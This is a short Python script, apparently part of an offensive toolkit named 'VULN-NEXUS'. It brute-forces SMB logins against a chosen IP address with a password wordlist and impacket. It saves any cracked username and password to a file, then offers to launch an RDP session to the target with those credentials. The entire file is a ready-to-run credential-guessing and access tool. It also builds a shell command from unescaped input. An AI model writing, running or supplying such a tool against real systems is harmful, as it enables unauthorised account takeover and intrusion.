import os
import sys
from impacket.smbconnection import SMBConnection

# Design Colors
G = '\033[92m'
R = '\033[91m'
Y = '\033[93m'
W = '\033[0m'

def test_smb_login(target_ip, username, password):
    try:
        # Create an SMB connection (Port 445)
        conn = SMBConnection(target_ip, target_ip, sess_port=445)
        conn.login(username, password)
        conn.logoff()
        return True
    except Exception:
        return False

def run_brute():
    print(f"\n{G}[+] VULN-NEXUS: SMB AUTHENTICATION MODULE{W}")
    target = input("Enter Target IP: ")
    user = input("Enter Username: ")
    passlist_path = input("Enter path to Password List: ")

    if not os.path.exists(passlist_path):
        print(f"{R}[!] File not found.{W}")
        return

    found_pass = None

    with open(passlist_path, 'r') as f:
        for line in f:
            password = line.strip()
            print(f"[*] Testing: {password}", end='\r')
            
            if test_smb_login(target, user, password):
                found_pass = password
                print(f"\n{G}[!] SUCCESS: {user}:{password}{W}")
                
                # Save results
                with open("found_creds.txt", "a") as out:
                    out.write(f"IP: {target} | User: {user} | Pass: {password}\n")
                break

    if found_pass:
        choice = input(f"\n{Y}Do you want to connect via RDP now? (yes/no): {W}").lower()
        if choice == 'yes' or choice == 'y':
            print(f"[*] Launching FreeRDP to {target}...")
            # Command for FreeRDP /v:Target /u:User /p:Pass /cert-ignore
            os.system(f"xfreerdp /v:{target} /u:{user} /p:{found_pass} /cert-ignore +clipboard /dynamic-resolution")
    else:
        print(f"\n{R}[-] No valid passwords found in list.{W}")

if __name__ == "__main__":
    run_brute()
